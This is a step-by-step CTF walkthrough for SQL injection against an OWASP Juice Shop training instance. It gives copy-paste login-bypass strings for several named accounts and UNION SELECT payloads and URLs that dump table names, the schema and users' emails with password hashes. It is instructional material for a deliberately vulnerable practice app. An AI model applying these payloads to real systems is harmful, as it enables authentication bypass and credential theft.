# SQL Injection Visual Guide - Exact Locations & What to Type

## 🎯 Challenge Navigation Map

### Starting Point
1. Open browser
2. Go to: `http://155.138.197.128:3003`
3. You'll see the OWASP Juice Shop homepage

---

## 📍 CHALLENGE 1: Login Admin (Easiest - Start Here!)

### Where to Click:
```
Top Menu Bar → Account Icon (person silhouette) → Login
```

### What You'll See:
```
┌─────────────────────────────────┐
│         OWASP Juice Shop        │
│                                 │
│  ┌───────────────────────────┐  │
│  │ Email                     │  │ ← TYPE HERE: admin@juice-sh.op'--
│  └───────────────────────────┘  │
│                                 │
│  ┌───────────────────────────┐  │
│  │ Password                  │  │ ← TYPE HERE: x
│  └───────────────────────────┘  │
│                                 │
│  [────── Log in ──────]         │ ← CLICK THIS
│                                 │
└─────────────────────────────────┘
```

### Exact Steps:
1. **Click** in Email box
2. **Type:** `admin@juice-sh.op'--`
3. **Click** in Password box
4. **Type:** `x` (or any text)
5. **Click** the blue "Log in" button

### Success Signs:
✅ Green popup: "Login successful"
✅ Top-right shows: "admin@juice-sh.op"
✅ Challenge solved notification
✅ Score increases

---

## 📍 CHALLENGE 2: Extract Database Tables

### Where to Click:
```
Top Menu Bar → Magnifying Glass Icon (Search)
```

### What You'll See:
```
┌─────────────────────────────────┐
│         OWASP Juice Shop        │
│                                 │
│  ┌───────────────────────────┐  │
│  │ 🔍 Search...              │  │ ← PASTE HERE
│  └───────────────────────────┘  │
│                                 │
└─────────────────────────────────┘
```

### Exact Payload to Paste:
```sql
'))UNION SELECT 1,2,3,4,group_concat(name),6,7,8,9 FROM sqlite_master WHERE type='table'--
```

### To See Results:
1. **After pasting**, press Enter
2. **Open new tab**
3. **Paste this URL:**
```
http://155.138.197.128:3003/rest/products/search?q='))UNION%20SELECT%201,2,3,4,group_concat(name),6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--
```
4. **You'll see JSON with all table names**

---

## 📍 CHALLENGE 3: Get All User Passwords

### Method 1: Search Box
1. **Click** magnifying glass
2. **Paste exactly:**
```sql
x'))UNION SELECT 1,2,3,4,group_concat(email||':'||password),6,7,8,9 FROM Users--
```
3. **Press** Enter

### Method 2: Direct URL (Easier!)
1. **Open new browser tab**
2. **Paste this entire URL:**
```
http://155.138.197.128:3003/rest/products/search?q=x'))UNION%20SELECT%201,2,3,4,group_concat(email||':'||password),6,7,8,9%20FROM%20Users--
```
3. **Look for** `"deluxePrice"` in the response

---

## 📍 ALL SQL INJECTION ENTRY POINTS

### 1️⃣ Login Page (`/login`)
- **Location:** Account → Login
- **Fields:** Email, Password
- **Payload:** `email@domain.com'--`

### 2️⃣ Search Box (`/search`)
- **Location:** Magnifying glass icon
- **Field:** Search input
- **Payload:** `'))UNION SELECT...--`

### 3️⃣ User Registration (`/register`)
- **Location:** Account → Login → "Not yet a customer?"
- **Fields:** Email, Password, Security Answer
- **Payload:** In email or answer field

### 4️⃣ Customer Feedback (`/contact`)
- **Location:** Side menu → Customer Feedback
- **Field:** Comment (rating needs DevTools)
- **Payload:** In comment text

### 5️⃣ Product Reviews
- **Location:** Click any product → Reviews section
- **Field:** Review text
- **Payload:** In review message

### 6️⃣ Forgot Password (`/forgot-password`)
- **Location:** Login → "Forgot your password?"
- **Field:** Email
- **Payload:** `email@domain.com'--`

---

## 🎮 Quick Copy-Paste Challenges

### Login as Admin:
```
Email: admin@juice-sh.op'--
Password: x
```

### Login as Jim:
```
Email: jim@juice-sh.op'--
Password: x
```

### Login as Bender:
```
Email: bender@juice-sh.op'--
Password: x
```

### Get All Tables:
```
'))UNION SELECT 1,2,3,4,group_concat(name),6,7,8,9 FROM sqlite_master WHERE type='table'--
```

### Get All Users:
```
'))UNION SELECT 1,2,3,4,group_concat(email),6,7,8,9 FROM Users--
```

### Get Passwords:
```
'))UNION SELECT 1,2,3,4,group_concat(email||':'||password),6,7,8,9 FROM Users--
```

---

## 🔍 How to View Hidden Data

### When Search Shows "No Results":

#### Option 1: Browser Console
1. Press **F12**
2. Click **Console** tab
3. Type: `allow pasting` (press Enter)
4. Paste:
```javascript
fetch(window.location.href).then(r => r.json()).then(d => console.log(d));
```

#### Option 2: Network Tab
1. Press **F12**
2. Click **Network** tab
3. Do your search
4. Click on `search?q=` request
5. Click **Response** tab

#### Option 3: Direct URL
1. Take your search payload
2. Replace spaces with `%20`
3. Add to: `http://155.138.197.128:3003/rest/products/search?q=YOUR_PAYLOAD_HERE`

---

## ⚡ Speed Run - All Challenges

### 1. Login Admin (200 pts)
```
Go to: Login
Email: admin@juice-sh.op'--
Pass: x
```

### 2. Login Jim (200 pts)
```
Email: jim@juice-sh.op'--
Pass: x
```

### 3. Login Bender (250 pts)
```
Email: bender@juice-sh.op'--
Pass: x
```

### 4. Database Schema (350 pts)
```
Search: '))UNION SELECT 1,2,3,4,sql,6,7,8,9 FROM sqlite_master--
```

### 5. User Credentials (300 pts)
```
Search: '))UNION SELECT 1,2,3,4,group_concat(email||':'||password),6,7,8,9 FROM Users--
```

---

## 🆘 Troubleshooting

### "Invalid email or password"
- Check for typos
- Make sure you have `'--` at the end
- Don't forget the apostrophe

### "No results found" in search
- The injection worked! 
- Check F12 → Network → Response
- Or use direct URL method

### "500 Internal Server Error"
- Wrong number of columns
- Try 9 columns: `1,2,3,4,5,6,7,8,9`

### Can't see the data
- Open browser console (F12)
- Look at Network tab
- Or paste URL directly in new tab

---

## 📊 Score Tracking

| Challenge | Points | Where | What to Type |
|-----------|---------|-------|--------------|
| Login Admin | 200 | Login | `admin@juice-sh.op'--` |
| Login Jim | 200 | Login | `jim@juice-sh.op'--` |
| Login Bender | 250 | Login | `bender@juice-sh.op'--` |
| Login Amy | 200 | Login | `amy@juice-sh.op'--` |
| Database Schema | 350 | Search | `'))UNION SELECT 1,2,3,4,sql,6,7,8,9 FROM sqlite_master--` |
| User Credentials | 300 | Search | `'))UNION SELECT 1,2,3,4,group_concat(email\|\|':'||password),6,7,8,9 FROM Users--` |

**Total Possible:** 1500+ points from SQL Injection alone!

---

Remember: This is YOUR CTF instance for learning. Have fun exploring!